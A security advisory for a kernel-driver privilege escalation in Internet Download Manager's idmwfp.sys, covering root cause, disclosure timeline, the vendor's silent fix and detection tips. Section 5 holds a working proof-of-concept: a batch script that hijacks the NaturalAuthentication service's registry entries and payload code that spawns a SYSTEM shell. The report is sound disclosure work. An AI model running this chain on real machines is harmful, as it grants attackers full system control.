# Internet Download Manager `idmwfp.sys` Local Privilege Escalation via a Kernel Registry Operation Primitive

| Item | Content |
| --- | --- |
| CVE ID | CVE-2026-90493 (CNA: VulDB) |
| Contact | kncrjvirx@gmail.com |
| Vendor | Tonec Inc. / Internet Download Manager Corp. |
| Affected product | Internet Download Manager **≤ 6.42 Build 63** (Windows) |
| Affected component | `idmwfp.sys` (Internet Download Manager WFP Driver), Windows kernel driver |
| Device interface | `\\.\IDMWFP` |
| Vulnerability class | Missing access control in a kernel driver / exposed IOCTL without caller authorization (CWE-266, CWE-284) |
| Attack vector | Local, low-privileged authenticated user, no interaction |
| CVSS v3.1 | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`, 8.8 |
| CVSS v4.0 | `CVSS:4.0/AV:L/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:P`, 9.3 |

---

## 1. Summary

During initialization, `idmwfp.sys` creates the device object `\Device\IDMWFP` with `WdmlibIoCreateDeviceSecure` and passes the security descriptor string `D:P(A;;GA;;;AU)` to that routine. `AU` stands for Authenticated Users and `GA` for GENERIC_ALL. As a result, any authenticated user on the machine can open `\\.\IDMWFP` with full access and send it arbitrary `DeviceIoControl` requests.

The overly permissive device ACL only provides the entry point. The actual defect is in the `IRP_MJ_DEVICE_CONTROL` handler `sub_14000E9E0` of the main control plane: `IOCTL 0x12C028` dispatches subcommands by the first byte of the request packet, and all four subcommands `0x0C`–`0x0F` enter the same handler `sub_140005B90`, which — after parsing the user input — directly calls `ZwOpenKey` / `ZwCreateKey` / `ZwQueryValueKey` and the runtime-resolved `ZwSetValueKey`, `ZwDeleteValueKey`, and `ZwDeleteKey` in the driver's own (kernel) security context.

There is no authorization anywhere on this path:

- The caller is never identified. `IoGetRequestorProcessId` is used only once in the entire driver, by `0x12C00C`, to tag a PID policy object; the registry subcommands never call it;
- There is no path allowlist whatsoever. The relative path submitted by the caller is concatenated verbatim after `\REGISTRY\MACHINE\` or `\REGISTRY\USER\`;
- The caller's thread is never impersonated (no `SeAccessCheck` / `PsImpersonateClient` / `ZwAccessCheckAndAuditAlarm`), so the ACL of the registry object plays no part in the decision.

The consequence: an ordinary local user can read, create, modify, and delete registry values under arbitrary paths in `HKLM` and `HKU` through this driver, thereby achieving local privilege escalation (see Section 5).

The vendor has published no security advisory. In `idmwfp64.sys` 6.43.1.91 shipped with the IDM 6.43 series, a namespace allowlist has appeared, and paths such as `HKLM\SYSTEM\CurrentControlSet\Services\...` are no longer accepted — a silent fix.

---

## 2. Disclosure Timeline

| Date | Event |
| --- | --- |
| 2026-05-01 | Vulnerability discovered |
| 2026-05-06 | Attempted to contact the vendor; email sent to `support@internetdownloadmanager.com` and `support@tonec.com`; no response received |
| 2026-07-15 | PoC and full technical report published (this repository), and submitted to VulDB |
| 2026-09-13 | CVE-2026-90493 assigned |

70 days elapsed from the first vendor contact to the publication of the PoC, during which we received no reply from the vendor and observed no security advisory. The vendor's fix landed silently in the form of a namespace allowlist in the 6.43 series driver, and not a single entry in the public release notes mentions a driver security issue.

---

## 3. Scope

### 3.1 Affected Versions

- Affected range: Internet Download Manager **6.42 Build 63 and all earlier versions**
- Confirmed vulnerable sample: `idmwfp.sys` 6.41.23.87 (product version 6.41.23.1), shipped with Internet Download Manager 6.42 Build 63.
- Confirmed no longer reproducible: `idmwfp64.sys` 6.43.1.91 (product version 6.43.1.1), SHA-256 `8acffb0181146e96c44a94c5b364d657b775936ebb4d0fcce591068f74803c4a`, shipped with Internet Download Manager 6.43 Build 5. In that version the registry handler decodes a privileged policy block before the operation and matches the path against allow/deny pattern tables (see Section 7).
- The fix was introduced with the 6.43 series. Around the same time the vendor renamed the driver file from `idmwfp.sys` to `idmwfp64.sys` and jumped the version number to 6.43.x.

### 3.2 Preconditions for the Attack Surface

The attack surface exists when three conditions hold at the same time:

1. Internet Download Manager is installed. `idmwfp.sys` is not an optional component; a normal installation places it in `%SystemRoot%\System32\drivers\` and registers the kernel service `IDMWFP` of the same name, loaded by the Service Control Manager.
2. The `IDMWFP` service is running. Under the default configuration it starts automatically. Whether the IDM application is open is irrelevant to the attack surface, since the driver is loaded by the SCM.
3. The machine has at least one ordinary local account that the attacker controls.

---

## 4. Root Cause Analysis

### 4.1 The Device Object Is Open to All Authenticated Users

The relevant code in `DriverEntry@0x14000DC10`:

```c
RtlInitUnicodeString(&DestinationString, L"\\Device\\IDMWFP");
RtlInitUnicodeString(&SymbolicLinkName, L"D:P(A;;GA;;;AU)");
Version = WdmlibIoCreateDeviceSecure(
            DriverObject,
            0,
            &DestinationString,
            0x12u,          // DeviceType = FILE_DEVICE_NETWORK
            0x100u,         // FILE_DEVICE_SECURE_OPEN
            0,
            &SymbolicLinkName,   // SDDL
            &DeviceClassGuid,
            &DeviceObject);
...
RtlInitUnicodeString(&SymbolicLinkName, L"\\DosDevices\\IDMWFP");
IoCreateSymbolicLink(&SymbolicLinkName, &DestinationString);
```

The SDDL `D:P(A;;GA;;;AU)` contains a single ACE: trustee `AU` (Authenticated Users), mask `GA` (GENERIC_ALL), with no inheritance flags. A user-mode `CreateFileW(L"\\\\.\\IDMWFP", GENERIC_READ | GENERIC_WRITE, ...)` therefore returns a valid handle for any logged-on user.

### 4.2 Main Control Plane and Subcommand Dispatch

`DriverObject->MajorFunction[14]` (`IRP_MJ_DEVICE_CONTROL`) points to `sub_14000E9E0`. That routine takes `Parameters.DeviceIoControl.IoControlCode`, `InputBufferLength`, and `OutputBufferLength` from the `IO_STACK_LOCATION`; the input and output buffers share `Irp->AssociatedIrp.SystemBuffer` (METHOD_BUFFERED).

Confirmed IOCTLs:

| IOCTL | Entry point | Purpose |
| --- | --- | --- |
| `0x12C004` | inline | Query the policy summary for a given PID |
| `0x12C008` | `sub_140014330` | Create/update the policy and TLV rules for a given PID |
| `0x12C00C` | `sub_1400140E0` | Bind an event object and redirect port to a given PID |
| `0x12C010` | `sub_140013EB0` | Pop a notification queue message for a given PID |
| `0x12C014` / `0x12C018` | `sub_140015F90` | Active-flow control wrappers (opcode `0x80` / `0x81`) |
| `0x12C01C` | `sub_140014650` | Update the extended field of a PID policy |
| `0x12C020` | `sub_140015F90` | Active-flow control (caller-specified opcode) |
| `0x12C024` | `sub_140010230` | Reverse-look-up a PID from a port pair |
| `0x12C028` | subcommand dispatch | Registry / file / WFP auxiliary operations |

The dispatch for `0x12C028` subtracts 9 from the first byte of the request to form the jump index (`add eax, 0FFFFFFF7h; cmp eax, 7; ja default`); the valid subcommands are `9`–`0x10`:

| Subcommand | Entry point | Purpose |
| --- | --- | --- |
| `9` | `sub_140005610` | Fixed operation on `\SystemRoot\System32\drivers\etc\hosts` |
| `0x0A` | `sub_140003DA0` | Bulk-delete WFP filters by condition value |
| `0x0B` | `sub_140005A40` | Delete four fixed values under a fixed path (hardcoded IDM license information) |
| **`0x0C`–`0x0F`** | **`sub_140005B90`** | **Registry read/write/delete on a caller-specified path** |
| `0x10` | `sub_140006490` | Volume information summary query |

`sub_14000E9E0` performs only a length check on each subcommand and then calls the handler directly, with no identity check of any kind.

Worth calling out separately is `0x0B`: it accesses IDM's own namespace `\REGISTRY\MACHINE\SOFTWARE\Wow6432Node\Internet Download Manager`, with both the path and the value names hardcoded in the driver, using the same `D:P(A;;GA;;;AU)` device and the same inline decoding logic. This shows that IDM is entirely capable of confining registry operations to its own namespace; letting `0x0C`–`0x0F` accept arbitrary paths is a separate design decision, not a limitation of capability.

### 4.3 The Registry Handler That Lacks Authorization

The entry checks of `sub_140005B90(PRIV_CMD *input, ULONG input_len, ULONG output_len, ULONG *out_len)` are only three: `input->mode <= 1`, `KeGetCurrentIrql() == 0`, and a one-time XOR/ROL constant decode of the root prefix strings if they have not been decoded yet. None of them concerns the caller's identity.

The function then does the following:

1. Reads `path_offset` and `path_wchars`, and validates `path_wchars >= 0xA` and `input_len >= path_offset + 2 * path_wchars`;
2. Decodes that UTF-16 region in place, character by character;
3. Scans backwards for the last backslash and splits the string into "relative key path" and "value name"; if the value name is exactly a single `@`, it is rewritten to `L'\0'`, pointing the operation at the key's default value;
4. Selects the root prefix from the low bits of `flags` and writes the root prefix, the key path, and a terminator into the UNICODE_STRING buffer in order, while the value name is carried separately through `ValueName.Buffer`;
5. Enters the `switch (subcommand)` and calls the kernel registry APIs.

The root prefixes used in step 4 are two wide strings likewise encoded with `(w ^ 0xDAAD) + 9555` and `ROR 16, (4+i) & 0xF`; decoded character by character they are:

```text
xmmword_1400244D8 -> "\REGISTRY\MACHINE\"
xmmword_1400244B8 -> "\REGISTRY\USER\"
```

The control flow for the two prefixes is mutually exclusive: `flags & 1` selects MACHINE, otherwise only `flags & 2` selects USER; if neither bit is set, the function returns `STATUS_INVALID_PARAMETER` directly.

The registry calls of the four subcommands are as follows (offsets are counted from the start of `PRIV_CMD`; `+0x0C` is the offset of the data region within the packet, `+0x0E` is the byte count of the data region):

| Subcommand | Kernel calls | Access | Notes |
| --- | --- | --- | --- |
| `0x0C` | `ZwOpenKey(KEY_QUERY_VALUE)` → `ZwQueryValueKey(KeyValuePartialInformation)` | read-only | Output buffer at least 16 bytes; the result is written back into the same SystemBuffer, with the first 4 bytes overwritten by the returned length |
| `0x0D` | `ZwCreateKey(KEY_SET_VALUE)` (creating intermediate levels when necessary) → `ZwSetValueKey` | read/write | First validates `input_len >= data_offset + data_size`, then decodes the data region and writes it |
| `0x0E` | `ZwOpenKey(KEY_SET_VALUE)` → `ZwDeleteValueKey` | write | A missing value (`STATUS_OBJECT_NAME_NOT_FOUND`) is treated as success |
| `0x0F` | `ZwOpenKey(KEY_QUERY_VALUE \| DELETE)` → `ZwDeleteValueKey` → `ZwQueryKey(KeyFullInformation)` → `ZwDeleteKey` | delete | The key is deleted only when both the subkey count and the value count are 0; otherwise `STATUS_KEY_HAS_CHILDREN` is returned |

The staged creation logic of `0x0D` is worth noting: it first calls `ZwCreateKey` with the full path, and when that returns `STATUS_OBJECT_NAME_NOT_FOUND` it truncates one level via `sub_140019C00` (scanning backwards for the last backslash in the buffer) and retries until it succeeds; after success it completes the path level by level using `sub_140019B70` (scanning forward for a backslash from a given offset), calling `ZwCreateKey` separately for each level. A multi-level key path that does not yet exist can therefore be created in a single call.

Three details together show that "authorization is omitted entirely":

- `IoGetRequestorProcessId` is never called. The only call site of that API in the driver is on the `0x12C00C` path (`0x14000EB65`), where it writes the caller PID into a policy object — unrelated to registry paths.
- The caller's thread is never impersonated, and no access check such as `SeAccessCheck` is invoked explicitly. The registry operations execute in the driver's own security context, and the ACL of the target object plays no part in the decision.
- Path concatenation performs no character filtering at all; `..`, `\`, and `.` all reach the object manager path verbatim.

### 4.4 Request Packet and Private Encoding

`0x0C`–`0x0F` share the same 20-byte header, followed by a path region and a data region. The structure below is organized according to the field naming in IDA, and the field offsets match the positions the driver reads:

```c
#pragma pack(push, 1)
typedef struct PRIV_CMD {
    uint8_t  subcmd;        // +0x00  0x0C / 0x0D / 0x0E / 0x0F
    uint8_t  mode;          // +0x01  must be <= 1
    uint16_t reserved0;     // +0x02
    uint32_t flags;         // +0x04  bit0 = MACHINE root, bit1 = USER root, bit8..11 = data encoding options
    uint16_t path_offset;   // +0x08  byte offset of the path region within the packet
    uint16_t path_wchars;   // +0x0A  UTF-16 character count of the path region, must be >= 10
    uint16_t data_offset;   // +0x0C  byte offset of the data region within the packet
    uint16_t data_size;     // +0x0E  byte count of the data region
    uint16_t value_type;    // +0x10  REG_SZ / REG_DWORD / ...
    uint8_t  seed0;         // +0x12  data encoding seed; 0xAD when 0
    uint8_t  seed1;         // +0x13  data encoding seed; 0xAD when 0
    /* +0x14: encoded_utf16_path[path_wchars] */
    /* then:   encoded_data[data_size]                */
} PRIV_CMD;
#pragma pack(pop)
```

The attacker-controlled fields cover the registry root (low bits of `flags`), the relative key path, the value name, the value type, the value content, and the encoding parameters. The driver only decodes and forwards.

The interface uses two private encodings; there is a reverse-engineering cost, but they do not constitute a security boundary:

**Path region**, with character index `i` starting at 0 and `rot = (4 + i) & 0xF`:

```c
decoded = ROR16((encoded ^ 0xDAAD) + 9555, rot);
```

**Data region**, with byte index `i` starting at 0 and `rot = (4 + i) & 7`:

```c
decoded = ROR8((encoded ^ 0xAD) + 83, rot);
```

When `flags & 0xF00` is non-zero, the write path of `0x0D` and the query path of `0x0C` layer another round of transformation on top, with the branch condition depending on `value_type`:

- When `value_type ∈ {1, 2, 7}` (`REG_SZ` / `REG_EXPAND_SZ` / `REG_MULTI_SZ`) and `flags & 0x600` is non-zero, processing is done in UTF-16 units; within that, `flags & 0x400` runs an additional wchar-wise Fisher-Yates-style permutation (`sub_140005430`), necessarily followed by a character-wise `decoded = seed ^ (encoded - seed)` transformation (`sub_140005300`);
- For other types, when `flags & 0x100` is non-zero, a 32-bit-wise permutation is applied (`sub_140005260`).

`seed0` / `seed1` act as the seeds of these two branches respectively, and are treated as `0xAD` when 0. By default (carrying only the root selection bit) neither transformation applies, and ordinary `REG_DWORD` / `REG_SZ` reads and writes need only the two basic codecs above.

The output of `0x0C` is a native `KEY_VALUE_PARTIAL_INFORMATION`, whose first 12 bytes are `TitleIndex` / `Type` / `DataLength`, immediately followed by data encoded with the same byte transformation. Under `METHOD_BUFFERED` the input and output share the same SystemBuffer, and the driver writes the returned length to `+0x00..0x03`, overwriting the header of the caller's request packet (`subcmd` / `mode` / `reserved0`); the `flags` field from `+0x04` onward and the path and data regions after the packet header are unaffected. When the buffer is too small the driver returns `STATUS_BUFFER_OVERFLOW` or `STATUS_BUFFER_TOO_SMALL`, writing back to the same location.

---

## 5. PoC

### 5.1 Attack Chain Overview

```text
ordinary local user (Medium IL)
   └─ poc.bat
        ├─ [1] idmwfp_reg_demo.exe query          read back the original ImagePath
        ├─ [2] idmwfp_reg_demo.exe set-expand-string  ImagePath  -> payload
        ├─ [3] idmwfp_reg_demo.exe set-dword          Start     -> 0x2  (auto)
        ├─ [4] idmwfp_reg_demo.exe set-dword          Type      -> 0x10 (own process)
        ├─ [5] idmwfp_reg_demo.exe set-multi-string   RequiredPrivileges -> 28 entries
        ├─ [6] idmwfp_reg_demo.exe query          confirm ImagePath has been rewritten
        └─ [7] sc start NaturalAuthentication
                 └─ SCM starts payload as LocalSystem
                      └─ StartProcessAsSystemInActiveSession() -> interactive SYSTEM cmd.exe
```

Steps 2 through 5 are all carried out through `\\.\IDMWFP`; the attacker needs no write permission on that service key.

### 5.2 Rewriting the Service Registry Entries

`poc.bat`:

```bat
set base=%~dp0
set file=%base%payload.exe
.\idmwfp_reg_demo.exe query machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\ImagePath" 128
.\idmwfp_reg_demo.exe set-expand-string machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\ImagePath" %file%
.\idmwfp_reg_demo.exe set-dword machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\Start" 0x2
.\idmwfp_reg_demo.exe set-dword machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\Type" 0x10
.\idmwfp_reg_demo.exe set-multi-string machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\RequiredPrivileges" "SeTcbPrivilege|SeChangeNotifyPrivilege|..."
.\idmwfp_reg_demo.exe query machine "SYSTEM\CurrentControlSet\Services\NaturalAuthentication\ImagePath" 128
sc start NaturalAuthentication
pause
```

### 5.3 Why NaturalAuthentication Was Chosen

Choosing a target service requires two conditions to hold at the same time, and `NaturalAuthentication` happens to satisfy both.

```text
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NaturalAuthentication]
"DisplayName"        = "@%systemroot%\system32\NaturalAuth.dll,-100"
"ImagePath"          = hex(2): "%SystemRoot%\system32\svchost.exe -k netsvcs -p"
"ObjectName"         = "LocalSystem"
"RequiredPrivileges" = hex(7): SeTcbPrivilege
                               SeChangeNotifyPrivilege
                               SeSystemEnvironmentPrivilege
"Start"              = dword:00000003   (SERVICE_DEMAND_START)
"Type"               = dword:00000020   (SERVICE_WIN32_SHARE_PROCESS)
"DependOnService"    = hex(7): RpcSs, ProfSvc, Schedule
```

**Condition one, the service identity is LocalSystem.** `ObjectName = LocalSystem`; the service body runs under a kernel-level identity, so changing its entry point is equivalent to executing the payload as SYSTEM.

**Condition two, an ordinary user is allowed to start the service.** Most services whose identity is LocalSystem cannot be started manually by an ordinary user.

### 5.4 Obtaining a SYSTEM Shell

The payload is a standard Windows service program with the service name hardcoded to `NaturalAuthentication`:

```cpp
constexpr char kServiceName[] = "NaturalAuthentication";

void WINAPI ServiceMain(DWORD, LPSTR*) {
    g_status_handle = RegisterServiceCtrlHandlerA(kServiceName, ServiceControlHandler);
    ...
    session0_launcher::StartProcessAsSystemInActiveSession(
        L"C:\\Windows\\system32\\cmd.exe",
        L"cmd.exe"
    );
    ...
}

int main(int argc, char* argv[]) {
    SERVICE_TABLE_ENTRYA service_table[] = {
        {const_cast<LPSTR>(kServiceName), ServiceMain},
        {nullptr, nullptr},
    };
    if (!StartServiceCtrlDispatcherA(service_table)) { ... }
}
```

The service name must match the hijacked service, otherwise the `StartServiceCtrlDispatcher` handshake between the SCM and the process fails.

The last step is a cross-session launch. The service is started by the SCM in session 0, and even with a SYSTEM token the process sits in a session with no interactive desktop. `StartProcessAsSystemInActiveSession` performs the following actions:

1. `WTSEnumerateSessionsW` enumerates sessions and takes the ID of the first `WTSActive` one, falling back to `WTSGetActiveConsoleSessionId` on failure;
2. `OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE)`, and `EqualSid` verifies that the current token's user SID really is `S-1-5-18`, failing outright otherwise;
3. `DuplicateTokenEx(..., TokenPrimary)` duplicates a primary token;
4. `SetTokenInformation(TokenSessionId)` changes the token's session ID to the currently active interactive session;
5. `CreateEnvironmentBlock` + `CreateProcessAsUserW(..., lpDesktop = L"winsta0\\default", ...)` launches `cmd.exe` on the interactive desktop.

### 5.5 Usage and Cleanup

Preparing the environment and executing:

```powershell
# 1. Install IDM (the official installer in this directory)
.\poc\idman642build63.exe

# 2. Confirm the driver has been loaded by the SCM
sc.exe query IDMWFP

# 3. Run the whole chain as an ordinary user
cd .\poc
.\poc.bat
```

All four values submitted by `poc.bat` can be restored on the server with the same primitive. `backup.reg` provides the complete original configuration; it can be imported by double-clicking, or executed in an administrator context:

```powershell
sc.exe stop NaturalAuthentication
reg.exe import .\poc\backup.reg
```

---

## 6. Impact

| Dimension | Assessment |
| --- | --- |
| Confidentiality | High. Arbitrary registry values under `HKLM` / `HKU` can be read, including other users' hives and security component configuration |
| Integrity | High. Arbitrary registry values can be created, modified, and deleted, and empty keys can be deleted |
| Availability | High. Protected configuration can be deleted and service definitions destroyed, preventing system components from starting |
| Privilege escalation | Yes. An ordinary local user can reach LocalSystem |
| Persistence | Yes. Service, driver, and autostart definitions can be rewritten directly |
| User interaction | Not required |
| Cross-privilege boundary | Yes. The hives of other users' SIDs and security product configuration can be accessed |

---

## 7. Vendor Response and Fix Status

The vendor has published no security advisory and has not responded regarding this report. As of the time of writing, not a single entry in the public release notes mentions a driver security issue.

The affected range ends at 6.42 Build 63. The vendor fixed the issue silently after the contact attempts: in `idmwfp64.sys` 6.43.1.91 shipped with IDM 6.43 Build 5, the function corresponding to `sub_140005B90` is located at `0x1400065B0`, and its entry performs an additional privileged string block decode, after which the path is pattern-matched before any registry operation:

```text
0x140006643  call 0x140005620            ; decode privileged string block
0x140006885  load allow/root pattern table, length 0x6E WCHAR
0x1400068BD  run pattern match against the decoded input path
0x1400068C9  return STATUS_OBJECT_PATH_INVALID when nothing matches
0x140006913  load deny component pattern table, length 0x6B WCHAR
0x14000694B  run pattern match against the path components
0x140006A5B  return STATUS_OBJECT_NAME_INVALID on a hit or an invalid split
```

The two recovered policy tables:

```text
Allowed roots:
  SOFTWARE\Internet Download Manager\*
  SOFTWARE\WOW6432Node\Internet Download Manager\*
  SOFTWARE\Classes\CLSID\*

Denied path components:
  AppID
  *ProgID
  InprocServer*
  LocalServer*
  InprocHandler*
  PersistentHandler*
  TypeLib
  TreatAs
  DefaultExtension
```

For the direct exploitation path of this vulnerability the fix is effective (`HKLM\SYSTEM\CurrentControlSet\Services\...` does not match the allow table), but it leaves the device interface open to all authenticated users, and the exposure of the driver's remaining IOCTLs (cross-PID policy delivery, event binding, notification queue reads, WFP filter deletion, and so on) is not narrowed; those interfaces carry no caller validation of their own either.

---

## 8. Detection and Hunting

Exploitation of this vulnerability leaves traces at the registry level; the following are worth checking:

- Whether `HKLM\SYSTEM\CurrentControlSet\Services\*\ImagePath` points to a path outside `%SystemRoot%`, or to a user-writable directory;
- Whether `RequiredPrivileges` contains a large number of privileges beyond `SeTcbPrivilege`, especially `SeDebugPrivilege`, `SeLoadDriverPrivilege`, `SeBackupPrivilege`, and `SeRestorePrivilege` appearing together;
- Whether service installation/configuration change events in the system log (4697, 7040, 7045) correlate in time with registry writes unrelated to `Microsoft-Windows-Kernel-...`.
